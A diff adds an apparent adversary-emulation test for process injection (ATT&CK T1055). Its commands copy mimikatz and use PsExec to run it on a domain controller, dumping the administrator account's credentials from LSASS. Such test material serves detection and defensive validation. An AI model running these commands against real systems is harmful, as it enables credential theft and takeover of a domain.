@@ -1,0 +1,9 @@
+################T1055.md################
+
+##Atomic Test #2 - Remote Process Injection in LSASS via mimikatz
+
+```copy mimikatz\mimikatz.exe %tmp%\mimikatz\x64\mimikatz.exe```
+cd PsExec
+```"PsExec.exe" /accepteula \\DC1 -c %tmp%\mimikatz\x64\mimikatz.exe "lsadump::lsa /inject /id:500" "exit"```
+
+```PAUSE```
